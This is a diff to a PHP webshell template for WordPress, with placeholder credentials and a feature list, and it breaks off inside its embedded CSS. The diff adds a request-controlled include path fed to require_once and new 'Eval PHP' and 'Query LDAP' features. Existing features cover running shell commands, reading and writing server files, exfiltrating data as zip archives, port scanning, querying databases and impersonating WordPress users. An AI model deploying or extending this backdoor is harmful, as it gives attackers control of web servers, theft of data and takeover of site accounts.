@@ -2,7 +2,47 @@
 
 // Exit if accessed directly
 if (!defined('ABSPATH')) {
-    require_once "../../../wp-load.php";
+    define("__WP__", true);
+
+    $wp_load = empty($_REQUEST['__PARAM_98__']) ? "../../../wp-load.php" : $_REQUEST['__PARAM_98__'];
+
+    $current_folder  = dirname(__FILE__);
+    $combined_path   = $current_folder . DIRECTORY_SEPARATOR . $wp_load;
+    $normalized_path = realpath($combined_path);
+
+    // If realpath() returns false, replace '..' components manually
+    if ($normalized_path === false) {
+        // Explode the combined path into parts
+        $parts = explode('/', $combined_path);
+
+        // Iterate through the parts and remove any '..'
+        $normalized_parts = array();
+        foreach ($parts as $part) {
+            if ($part === '..') {
+                array_pop($normalized_parts);
+            }
+            else {
+                $normalized_parts[] = $part;
+            }
+        }
+
+        // Reconstruct the normalized path
+        $normalized_path = implode('/', $normalized_parts);
+    }
+
+    if (!file_exists($normalized_path)) {
+        echo "<pre>";
+        echo "ALERT: wp-load.php not found. Please provide the path to the wp-load.php file using the '__PARAM_98__' parameter.\n";
+        echo "Example: http://example.com/wp-content/plugins/webshell/template.php?wp-load=../../wp-load.php";
+        echo "\n\n";
+        echo "Current path: $current_folder\n";
+        echo "Computed path: $normalized_path";
+        echo "</pre>";
+
+        die;
+    }
+
+    require_once $wp_load;
 
     /*
      * Version: 1.0.0
@@ -20,22 +60,24 @@ if (!defined('ABSPATH')) {
     error_reporting(0);
     session_start();
 
-// Features name constants
-    $LOGIN = "__FEAT_LOGIN__";
-    $FILE_EXTRACTION = "__FEAT_FILE_EXTRACTION__";
+    // Features name constants
+    $LOGIN                   = "__FEAT_LOGIN__";
+    $FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
     $FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
-    $DIRECTORY_LISTING = "__FEAT_DIRECTORY_LISTING__";
-    $EXFILTRATE = "__FEAT_EXFILTRATE__";
-    $PORT_SCAN = "__FEAT_PORT_SCAN__";
-    $WRITE_FILE = "__FEAT_WRITE_FILE__";
-    $RUN_COMMAND = "__FEAT_RUN_COMMAND__";
-    $PHP_INFO = "__FEAT_PHP_INFO__";
-    $QUERY_DATABASES = "__FEAT_QUERY_DATABASES__";
-    $IMPERSONATE_WP_USER = "__FEAT_IMPERSONATE_WP_USER__";
+    $DIRECTORY_LISTING       = "__FEAT_DIRECTORY_LISTING__";
+    $EXFILTRATE              = "__FEAT_EXFILTRATE__";
+    $PORT_SCAN               = "__FEAT_PORT_SCAN__";
+    $WRITE_FILE              = "__FEAT_WRITE_FILE__";
+    $RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
+    $PHP_INFO                = "__FEAT_PHP_INFO__";
+    $QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
+    $QUERY_LDAP              = "__FEAT_QUERY_LDAP__";
+    $EVAL                    = "__FEAT_EVAL__";
+    $IMPERSONATE_WP_USER     = "__FEAT_IMPERSONATE_WP_USER__";
 
     $USERNAME = "__USERNAME__";
     $PASSWORD = "__PASSWORD__";
-    $SALT = "__SALT__";
+    $SALT     = "__SALT__";
 
     /**
      * Define the enabled features
@@ -43,78 +85,92 @@ if (!defined('ABSPATH')) {
      * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
      */
     $ENABLED_FEATURES = array(
-        $FILE_EXTRACTION => array(
-            "title" => "File extraction",
+        $FILE_EXTRACTION         => array(
+            "title"       => "File extraction",
             "description" => "Extract file content as base64.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
         ),
         $FILE_EXTRACTION_PREVIEW => array(
-            "title" => "File extraction",
+            "title"       => "File extraction",
             "description" => "Extract file content as base64.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
-            "hidden" => true,
+            "hidden"      => true,
         ),
-        $DIRECTORY_LISTING => array(
-            "title" => "Directory listing",
+        $DIRECTORY_LISTING       => array(
+            "title"       => "Directory listing",
             "description" => "List all files and folders in a directory and optionally its subdirectories.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
         ),
-        $EXFILTRATE => array(
-            "title" => "Exfiltrate",
+        $EXFILTRATE              => array(
+            "title"       => "Exfiltrate",
             "description" => "Exfiltrate data from the server in a password protected zip archive.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
         ),
-        $PORT_SCAN => array(
-            "title" => "Port scan",
+        $PORT_SCAN               => array(
+            "title"       => "Port scan",
             "description" => "Scan a given range of TCP ports using connect method.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
-  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
 </svg>',
         ),
-        $WRITE_FILE => array(
-            "title" => "Write file",
+        $WRITE_FILE              => array(
+            "title"       => "Write file",
             "description" => "Write a file to the given path, writing permission are required.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
         ),
-        $RUN_COMMAND => array(
-            "title" => "Run command",
+        $RUN_COMMAND             => array(
+            "title"       => "Run command",
             "description" => "Run a system command using the default shell.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
 </svg>',
         ),
-        $PHP_INFO => array(
-            "title" => "PHP Info",
+        $PHP_INFO                => array(
+            "title"       => "PHP Info",
             "description" => "Display PHP information.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
 </svg>',
         ),
-        $QUERY_DATABASES => array(
-            "title" => "Query databases",
+        $QUERY_DATABASES         => array(
+            "title"       => "Query databases",
             "description" => "Query databases using the provided credentials.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
+</svg>',
+        ),
+        $QUERY_LDAP              => array(
+            "title"       => "Query LDAP",
+            "description" => "Query LDAP using the provided credentials.",
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
+</svg>',
+        ),
+        $EVAL                    => array(
+            "title"       => "Eval PHP",
+            "description" => "Evaluate PHP code.",
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
         ),
     );
 
-// Enable WordPress specific features
+    // Enable WordPress specific features
     if (defined("__WP__") && __WP__) {
         $ENABLED_FEATURES[$IMPERSONATE_WP_USER] = array(
-            "title" => "Impersonate WP user",
+            "title"       => "Impersonate WP user",
             "description" => "Impersonate a WordPress user by changing the current session.",
-            "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+            "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
 </svg>',
         );
@@ -122,22 +178,24 @@ if (!defined('ABSPATH')) {
 
     date_default_timezone_set("UTC");
 
-    $CSS = <<<'EOD'
-/*! tailwindcss v3.4.3 | MIT License | https://tailwindcss.com*/*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:initial}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:initial;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:initial}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}[multiple],[type=date],[type=datetime-local],[type=email],[type=month],[type=number],[type=password],[type=search],[type=tel],[type=text],[type=time],[type=url],[type=week],input:where(:not([type])),select,textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#6b7280;border-width:1px;border-radius:0;padding:.5rem .75rem;font-size:1rem;line-height:1.5rem;--tw-shadow:0 0 #0000}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,input:where(:not([type])):focus,select:focus,textarea:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em;text-align:inherit}::-webkit-datetime-edit{display:inline-flex}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");background-position:right .5rem center;background-repeat:no-repeat;background-size:1.5em 1.5em;padding-right:2.5rem;-webkit-print-color-adjust:exact;print-color-adjust:exact}[multiple],[size]:where(select:not([size="1"])){background-image:none;background-position:0 0;background-repeat:unset;background-size:initial;padding-right:.75rem;-webkit-print-color-adjust:unset;print-color-adjust:unset}[type=checkbox],[type=radio]{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;user-select:none;flex-shrink:0;height:1rem;width:1rem;color:#2563eb;background-color:#fff;border-color:#6b7280;border-width:1px;--tw-shadow:0 0 #0000}[type=checkbox]{border-radius:0}[type=radio]{border-radius:100%}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked,[type=radio]:checked{border-color:#0000;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}[type=checkbox]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=checkbox]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=radio]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=radio]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=checkbox]:indeterminate,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:#0000;background-color:currentColor}[type=checkbox]:indeterminate{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media (forced-colors:active) {[type=checkbox]:indeterminate{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:#0000;background-color:currentColor}[type=file]{background:unset;border-color:inherit;border-width:0;border-radius:0;padding:0;font-size:unset;line-height:inherit}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}::-webkit-scrollbar{width:.5rem}::-webkit-scrollbar-track{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-track{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(161 161 170/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(113 113 122/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(82 82 91/var(--tw-bg-opacity))}}*,::backdrop,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#3b82f680;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.visible{visibility:visible}.fixed{position:fixed}.relative{position:relative}.inset-y-0{top:0;bottom:0}.z-50{z-index:50}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.-mx-4{margin-left:-1rem;margin-right:-1rem}.-my-2{margin-top:-.5rem;margin-bottom:-.5rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.mb-8{margin-bottom:2rem}.ml-3{margin-left:.75rem}.ml-72{margin-left:18rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mr-1\.5{margin-right:.375rem}.mt-1{margin-top:.25rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.mb-0{margin-bottom:0}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.flow-root{display:flow-root}.grid{display:grid}.contents{display:contents}.hidden{display:none}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.max-h-96{max-height:24rem}.min-h-full{min-height:100%}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-72{width:18rem}.w-8{width:2rem}.w-full{width:100%}.min-w-0{min-width:0}.min-w-full{min-width:100%}.max-w-full{max-width:100%}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.flex-grow{flex-grow:1}.flex-grow-0{flex-grow:0}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-all{-webkit-user-select:all;-moz-user-select:all;user-select:all}.list-inside{list-style-position:inside}.list-disc{list-style-type:disc}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-8{gap:2rem}.gap-x-3{-moz-column-gap:.75rem;column-gap:.75rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-2{row-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-y-6{row-gap:1.5rem}.gap-y-7{row-gap:1.75rem}.space-y-6>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(229 231 235/var(--tw-divide-opacity))}.divide-gray-300>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(209 213 219/var(--tw-divide-opacity))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.overflow-y-scroll{overflow-y:scroll}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:.25rem}.rounded-md{border-radius:.375rem}.border-0{border-width:0}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8/var(--tw-border-opacity))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.bg-indigo-500{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229/var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.bg-white\/5{background-color:#ffffff0d}.bg-yellow-100{--tw-bg-opacity:1;background-color:rgb(254 249 195/var(--tw-bg-opacity))}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity))}.bg-zinc-800{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity))}.p-2{padding:.5rem}.p-4{padding:1rem}.px-16{padding-left:4rem;padding-right:4rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}.py-4{padding-top:1rem}.pb-4,.py-4{padding-bottom:1rem}.pl-3{padding-left:.75rem}.pl-4{padding-left:1rem}.pr-10{padding-right:2.5rem}.pr-3{padding-right:.75rem}.pr-4{padding-right:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.align-middle{vertical-align:middle}.font-mono{font-family:ui-mono